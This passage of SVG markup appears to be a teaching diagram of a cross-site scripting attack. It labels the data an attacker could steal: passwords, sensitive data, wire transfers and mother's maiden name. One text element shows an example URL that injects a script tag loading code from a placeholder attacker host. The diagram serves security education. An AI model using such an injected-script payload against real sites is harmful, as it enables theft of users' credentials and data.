x1="346.86" y1="227.31" x2="335.23" y2="229.67" fill="none" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M362.89,140.06c1.11,0,79.58-3.82,79.58-3.82v60l-28.86-1-50.36-1.68Z" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M367.49,145.56c1,0,68.77-2.46,68.77-2.46v48.15l-25.08-.77-43.78-1.34Z" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M399,290.92c-7.42-.36-17-4.13-16.89-6.67,0,4.64-12.48,3.12-12.48,3.12s0,7.66.5,9.57c3.86,1.24,12.09.26,13,.47S402.33,296.83,399,290.92Z" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><polygon points="351.76 265.31 356 287.38 367.51 283.44 361.49 262.98 358.7 265.31 351.76 265.31" fill="#fff" stroke="#159c80" stroke-miterlimit="10" stroke-width="2"/><path d="M388,154.71l.37,7.45h10.29v-7.74Zm5.18,5.29-5-4.23-.2-1.06,5.2,4,5.46-4.27-.45,1.51Z" fill="#60bcd8"/><line x1="382.29" y1="147.4" x2="382.29" y2="186.96" fill="none" stroke="#ebf0f2" stroke-miterlimit="10" stroke-width="2"/><line x1="401.16" y1="155.66" x2="429.83" y2="154.9" fill="none" stroke="#60bcd8" stroke-miterlimit="10"/><line x1="429.83" y1="160.42" x2="401.16" y2="160.42" fill="none" stroke="#60bcd8" stroke-miterlimit="10"/><line x1="387.96" y1="166.42" x2="429.83" y2="166.42" fill="none" stroke="#dce3e5" stroke-miterlimit="10"/><line x1="429.83" y1="171.83" x2="387.96" y2="172.36" fill="none" stroke="#dce3e5" stroke-miterlimit="10"/><line x1="429.83" y1="178.06" x2="387.96" y2="177.98" fill="none" stroke="#dce3e5" stroke-miterlimit="10"/><line x1="429.83" y1="183.98" x2="388.41" y2="183.09" fill="none" stroke="#dce3e5" stroke-miterlimit="10"/><line x1="429.49" y1="149.06" x2="387.96" y2="150.59" fill="none" stroke="#dce3e5" stroke-miterlimit="10"/><polygon points="407.23 169.3 404.42 166.81 407.98 165.81 397.38 159.07 400.93 171.11 402.68 168.29 404.5 171.36 407.23 169.3" fill="#159c80"/><polygon points="492.17 162.46 501.05 168.34 492.13 174.46 492.17 162.46" fill="#cbd0d1"/><polygon points="550.88 194.48 541.99 188.59 550.91 182.48 550.88 194.48" fill="#cbd0d1"/><path d="M26.34,27l-.07,9.73,13.16.1.07-9.74Zm6.53,6.56L26.6,28.28,26.34,27l6.55,4.91,6.61-4.82-.38,1.32Z" fill="#333332"/><text transform="translate(46.25 36.98)" font-size="14" fill="#333332" font-family="Arial-BoldMT, Arial" font-weight="700">https://insecure-website.com/comment?message=&lt;script src=https://evil-use<tspan x="513.89" y="0" letter-spacing="-0.06em">r</tspan><tspan x="518.57" y="0">.net/badscript.js&gt;&lt;/script&gt;</tspan></text><polygon points="329.8 67.67 323.87 76.53 317.8 67.58 329.8 67.67" fill="#cbd0d1"/><polyline points="150.91 274.75 195.22 274.75 195.22 194.48 212.91 194.48 212.91 135.23 166.94 135.23 166.94 151.28 181.91 151.28 181.91 72.05 47.38 72.05 47.38 48.61" fill="none" stroke="#cbd0d1" stroke-miterlimit="10"/><polygon points="117.66 78.06 108.77 72.17 117.69 66.05 117.66 78.06" fill="#cbd0d1"/><path d="M83.22,413.6a3.14,3.14,0,0,1-.22,1.15,2.6,2.6,0,0,1-.66.92,3.4,3.4,0,0,1-1.07.65,5.35,5.35,0,0,1-1.49.34v1.69H78.65v-1.66c-.37,0-.7,0-1-.06a7.2,7.2,0,0,1-.87-.14c-.27-.06-.52-.14-.77-.22s-.48-.18-.72-.29V413.8a6.5,6.5,0,0,0,.75.33c.28.11.56.2.85.29s.59.16.89.22a5.43,5.43,0,0,0,.88.11v-2.62l-.14-.06-.13-.05-.12,0a9.55,9.55,0,0,1-1.31-.6,3.93,3.93,0,0,1-.94-.71,2.47,2.47,0,0,1-.56-.85,2.8,2.8,0,0,1-.19-1.07,2.63,2.63,0,0,1,.24-1.13,2.49,2.49,0,0,1,.67-.88,3.37,3.37,0,0,1,1.07-.61,5.32,5.32,0,0,1,1.41-.31v-1.3h1.13v1.25a9.59,9.59,0,0,1,1.47.2,9.46,9.46,0,0,1,1.58.53L82,408.43a11.31,11.31,0,0,0-1.12-.39,5.79,5.79,0,0,0-1.09-.21v2.42l.32.12a12.21,12.21,0,0,1,1.37.59,4.46,4.46,0,0,1,1,.69,2.53,2.53,0,0,1,.58.85A3,3,0,0,1,83.22,413.6Zm-5.47-4.91a1,1,0,0,0,.21.65,1.57,1.57,0,0,0,.69.43v-1.92a1.18,1.18,0,0,0-.67.25A.71.71,0,0,0,77.75,408.69Zm3,5a1.23,1.23,0,0,0,0-.35,1,1,0,0,0-.17-.27,1.48,1.48,0,0,0-.3-.23l-.43-.22v2.08a1.21,1.21,0,0,0,.72-.32A1,1,0,0,0,80.73,413.65Z" fill="#d60000"/><path d="M276.05,406.29a3.15,3.15,0,0,0-3.15,3.15c0,.1,0,.22,0,.33,0-.12,0-.23,0-.33a3.15,3.15,0,0,0-6.3,0c.32,4.05,3.82,5,6.3,7.62l0-.05s0,0,0,.05c2.49-2.63,6-3.57,6.3-7.62A3.15,3.15,0,0,0,276.05,406.29Z" fill="#d60000"/><path d="M142,344.43l-.49,4.35,4.41-1.23.39,3-4,.29,2.64,3.51-2.68,1.43-1.85-3.7-1.62,3.67-2.78-1.4,2.61-3.51-4-.31.46-3,4.32,1.23-.49-4.35Z" fill="#d60000"/><text transform="translate(90.93 416.38)" font-size="14" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700"><tspan letter-spacing="-0.01em">W</tspan><tspan x="13.09" y="0">ire transfer</tspan></text><text transform="translate(329.11 351.52)" font-size="14" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">Sensitive data</text><text transform="translate(287.44 415.78)" font-size="14" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">Mothe<tspan x="41.21" y="0" letter-spacing="0.04em">r</tspan><tspan x="47.18" y="0" letter-spacing="-0.04em">’</tspan><tspan x="50.55" y="0">s maiden name</tspan></text><path d="M315.68,349v-.66a3,3,0,0,1,.1-.82,2.56,2.56,0,0,1,.28-.71,3.58,3.58,0,0,1,.49-.65,8.14,8.14,0,0,1,.73-.65c.25-.2.47-.37.64-.53a2.92,2.92,0,0,0,.42-.46,1.86,1.86,0,0,0,.23-.47,2,2,0,0,0,.07-.58,1.15,1.15,0,0,0-.34-.84,1.47,1.47,0,0,0-1.05-.33,3.91,3.91,0,0,0-1.32.26,13.82,13.82,0,0,0-1.47.63l-.91-2a8.22,8.22,0,0,1,.84-.42,8.55,8.55,0,0,1,.93-.36,8.24,8.24,0,0,1,1-.24,5.58,5.58,0,0,1,1-.09,5.52,5.52,0,0,1,1.64.22,3.38,3.38,0,0,1,1.24.63,2.79,2.79,0,0,1,.78,1,3.27,3.27,0,0,1,.27,1.36,3.75,3.75,0,0,1-.12,1,2.9,2.9,0,0,1-.37.82,3.75,3.75,0,0,1-.61.73c-.25.24-.54.49-.86.75s-.46.36-.62.51a2.51,2.51,0,0,0-.36.41,1.26,1.26,0,0,0-.19.41,2.31,2.31,0,0,0-.05.49V349Zm-.29,3.05a1.85,1.85,0,0,1,.12-.71,1.25,1.25,0,0,1,.33-.47,1.37,1.37,0,0,1,.51-.26,2.33,2.33,0,0,1,1.21,0,1.44,1.44,0,0,1,.49.26,1.27,1.27,0,0,1,.34.47,1.85,1.85,0,0,1,.12.71,1.76,1.76,0,0,1-.12.68,1.27,1.27,0,0,1-.34.47,1.33,1.33,0,0,1-.49.28,2.33,2.33,0,0,1-1.21,0,1.27,1.27,0,0,1-.51-.28,1.25,1.25,0,0,1-.33-.47A1.76,1.76,0,0,1,315.39,352.05Z" fill="#d60000"/><text transform="translate(149.84 354.23)" font-size="14" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">Password</text></svg>